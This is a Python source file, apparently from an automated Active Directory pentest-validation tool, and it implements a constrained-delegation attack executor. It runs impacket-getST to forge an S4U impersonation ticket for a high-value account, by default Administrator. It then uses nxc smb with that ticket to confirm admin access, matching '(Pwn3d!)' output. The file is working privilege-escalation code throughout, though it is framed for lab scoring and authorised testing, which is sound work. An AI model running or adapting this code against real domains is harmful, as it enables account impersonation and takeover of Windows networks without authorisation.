"""Constrained-delegation (protocol-transition) validation executor -- FULL (T1b).

Encodes the PROVEN CONSTRAINED-DELEG-PT recipe (claude-mem #66146),
parameterized and non-mutating:

    impacket-getST -spn <allowed_spn> -impersonate <HVT> <dom>/<deleg>:<pw>
        (the delegation-enabled principal authenticates with the operator creds;
         KRB5CCNAME is UNSET so getST writes the S4U ccache to CWD)
    nxc smb <target_host> -k --use-kcache          (ticket-backed access = PROOF)

The delegation-enabled principal (``deleg_principal``, the account holding
msDS-AllowedToDelegateTo) performs S4U2self+S4U2proxy to the allowed SPN while
impersonating a high-value principal; ticket-backed SMB access as that principal
is the terminal proof. Non-mutating: no AD object is created or changed, so there
is no rollback. ``exit 0 is never proof`` -- the terminal ``ok`` is the nxc
access predicate, not any return code.

The operator's credential lives only in-process (masked in every stored argv via
:func:`redact_argv`); the saved ticket path is kept in a local var and never
reaches the receipt. The terminal fact carries a non-secret token over public
identifiers only.

Scoring identity (ad-lab-harness ``truth/GOAD-proof.json``): CONSTRAINED-DELEG-PT
keys on ``{domain, principal}`` -- the delegation principal must be in the
vulnerable set. ``target_identity`` produces exactly those attributes.
"""
from __future__ import annotations
from .. import netresolve

import re
from pathlib import Path
from typing import Any, Optional

from ..recommend import ParamSpec, ParamValue, values, recommended_spn
from .. import proof
from ._reveal_common import key_material
from .base import (SecretReveal, ValidationExecutor, ExecutorContext, StepRecord, RunResult,
                   redact_argv)


# getST ticket-save marker (same tooling as rbcd.py, #66146).
_RE_GETST_TICKET = re.compile(r"(Saving|Updating) ticket in\s+(\S+)", re.I)
# nxc ticket-backed access success markers.
_RE_NXC_PWNED = re.compile(r"\(Pwn3d!\)", re.I)
_RE_NXC_AUTH_OK = re.compile(r"\bSMB\b.*\[\+\]", re.I)


class ConstrainedDelegExecutor(ValidationExecutor):
    technique = "CONSTRAINED-DELEG-PT"
    technique_class = "delegation"
    terminal_kind = "authn_success"
    mutating = False
    verified_recipe = True
    recipe_ref = ("#66146 CONSTRAINED-DELEG-PT = impacket-getST -spn <allowed_spn> "
                  "-impersonate <HVT> <dom>/<deleg>:<pw> (unset KRB5CCNAME) -> "
                  "nxc smb <t> -k --use-kcache (PROVED jon.snow -> Administrator)")

    # ---------------------------------------------------------------- params
    def param_specs(self, ctx: ExecutorContext, finding) -> list[ParamSpec]:
        host = finding.host or ""
        return [
            ParamSpec(
                name="deleg_principal", kind="principal_name",
                description="The delegation-enabled principal that holds "
                            "msDS-AllowedToDelegateTo and authenticates with the "
                            "operator credentials to request the S4U ticket.",
                recommended=ctx.config.username or "",
                rationale="The operator's own account is the constrained-delegation "
                          "principal aranum flagged; override to a specific "
                          "delegation account (#66142 override model).",
                required=True,
            ),
            ParamSpec(
                name="impersonate", kind="escalation_target",
                description="High-value principal to impersonate via S4U (the "
                            "escalation target proven by ticket-backed access).",
                recommended="Administrator",
                rationale="High-value default; override to the supplied user or a "
                          "specific DC per the engagement (#66142 override model).",
            ),
            ParamSpec(
                name="target_spn", kind="spn",
                description="The allowed SPN requested in the S4U2proxy step "
                            "(must be in the principal's msDS-AllowedToDelegateTo).",
                recommended=recommended_spn("cifs", host) if host else "cifs/<target>",
                rationale="cifs/<host> grants file-system / admin access when "
                          "impersonating a privileged principal.",
            ),
            ParamSpec(
                name="target_host", kind="target_host",
                description="Host to access with the impersonation ticket (proves "
                            "the S4U ticket is honoured as the impersonated "
                            "principal).",
                recommended=host,
                rationale="The host of the aranum constrained-delegation finding.",
            ),
        ]

    def target_identity(self, ctx, finding, params: dict[str, ParamValue]) -> dict[str, Any]:
        # CONSTRAINED-DELEG-PT facet keys on {domain, principal} -- the
        # delegation principal, not the finding host.
        principal = (params["deleg_principal"].value if "deleg_principal" in params
                     else None) or ctx.config.username or ""
        return {"domain": ctx.config.domain, "principal": principal}

    def steps_preview(self, ctx, finding, params) -> list[str]:
        v = values(params)
        dc = ctx.config.dc_ip
        return [
            f"impacket-getST -spn {v['target_spn']} -impersonate {v['impersonate']} "
            f"-dc-ip {dc} '<domain>/{v['deleg_principal']}:***'   (KRB5CCNAME unset)",
            f"nxc smb {v['target_host']} -k --use-kcache   (KRB5CCNAME=<ticket>)",
        ]

    # ---------------------------------------------------------------- auth argv
    def _op_auth_target(self, cfg, principal: str) -> tuple[str, list[str]]:
        """Auth as ``principal`` with the operator's secret.

        The delegation-enabled principal authenticates with the operator-supplied
        credential (password / NT hash / AES key); returns the impacket
        ``domain/principal[:pass]`` target plus any hash/aesKey flags.
        """
        target = f"{cfg.domain}/{principal}"
        extra: list[str] = []
        if cfg.nt_hash:
            extra = ["-hashes", cfg.nt_hash]
        elif cfg.aes_key:
            extra = ["-aesKey", cfg.aes_key]
        elif cfg.password is not None:
            target += f":{cfg.password}"
        return target, extra

    # ---------------------------------------------------------------- execute
    def revealed_secrets(self, artifact: dict) -> list[SecretReveal]:
        return list(artifact.get("_reveal", []))

    def execute(self, ctx: ExecutorContext, finding, params: dict[str, ParamValue]) -> dict:
        # Private recovery channel, populated before downstream proof/cleanup.
        artifact = {"_reveal": []}
        ctx._pending_reveal_artifact = artifact

        def finish_artifact(*args):
            artifact.update(self._artifact(*args))
            return artifact

        cfg = ctx.config
        v = values(params)
        deleg_principal = v["deleg_principal"]
        impersonate = v["impersonate"]
        spn = v["target_spn"]
        target_host = v["target_host"]
        dc = cfg.dc_ip
        out_dir = Path(ctx.output_dir)
        out_dir.mkdir(parents=True, exist_ok=True)
        op_target, op_extra = self._op_auth_target(cfg, deleg_principal)

        steps: list[StepRecord] = []
        errors: list[str] = []
        gate = {"classifier": "not_required", "op": None}
        mutation = {"applied": False,
                    "rollback": {"performed": False, "method": None, "verified": False}}

        def record(name, argv, res, ok, note=""):
            steps.append(StepRecord(name=name, ok=ok, argv_display=redact_argv(argv),
                                    returncode=res.returncode, note=note))

        # 1) S4U getST as the delegation principal -> impersonation ticket ----
        # #66146 gotcha: KRB5CCNAME must be UNSET before getST; it writes to CWD.
        getst_argv = ["impacket-getST", "-spn", spn, "-impersonate", impersonate,
                      "-dc-ip", dc, *op_extra, op_target]
        res = ctx.runner.run(getst_argv, timeout=cfg.tool_timeout_s,
                             env={"KRB5CCNAME": None}, cwd=str(out_dir))
        ticket = self._parse_ticket(res.stdout or "", out_dir)
        artifact["_reveal"].extend(key_material(self.technique, "ccache", impersonate, ticket))
        getst_ok = ticket is not None
        record("getST", getst_argv, res, getst_ok,
                note="ticket saved" if getst_ok else "no ticket")
        if not getst_ok:
            errors.append("getST_no_ticket")
            return finish_artifact(steps, gate, mutation, None, False, errors)

        # 2) ticket-backed access = the terminal proof -----------------------
        nxc_argv = ["nxc", "smb", target_host, "-k", "--use-kcache",
                    *netresolve.nxc_kerberos_flags(cfg)]
        res = ctx.runner.run(nxc_argv, timeout=cfg.tool_timeout_s,
                             env={"KRB5CCNAME": ticket}, cwd=str(out_dir))
        out = res.stdout or ""
        nxc_ok = bool(_RE_NXC_PWNED.search(out) or _RE_NXC_AUTH_OK.search(out))
        record("nxc_access", nxc_argv, res, nxc_ok,
               note="pwn3d" if _RE_NXC_PWNED.search(out) else "auth" if nxc_ok else "")
        if not nxc_ok:
            diag = netresolve.classify_resolution_failure(
                cfg, target_host, out + "\n" + (res.stderr or ""))
            if diag:
                errors.append(diag)
        if not nxc_ok:
            errors.append("nxc_access_failed")

        terminal_fact = proof.build_terminal_fact(
            self.terminal_kind, ok=nxc_ok, impersonated=impersonate,
            predicate=(f"impersonated {impersonate} to {spn} via constrained "
                       f"delegation as {cfg.domain}\\{deleg_principal}; "
                       f"ticket-backed SMB access on {target_host}"),
            proof_token=proof.proof_token("CONSTRAINED-DELEG-PT", cfg.domain,
                                          deleg_principal, impersonate, target_host,
                                          "pwn3d" if _RE_NXC_PWNED.search(out) else "auth"),
            extra={"target_host": target_host},
        )
        # complete = ticket obtained and the access step was executed.
        complete = getst_ok
        return finish_artifact(steps, gate, mutation, terminal_fact, complete, errors)

    # ---------------------------------------------------------------- helpers
    @staticmethod
    def _parse_ticket(stdout: str, out_dir: Path) -> Optional[str]:
        m = _RE_GETST_TICKET.search(stdout)
        if not m:
            return None
        raw = m.group(2).strip()
        p = Path(raw)
        return str(p if p.is_absolute() else out_dir / p)

    @staticmethod
    def _artifact(steps, gate, mutation, terminal_fact, complete, errors) -> dict:
        return {"steps": [s.as_step() for s in steps], "gate": gate,
                "mutation": mutation, "terminal_fact": terminal_fact,
                "complete": complete, "errors": errors}
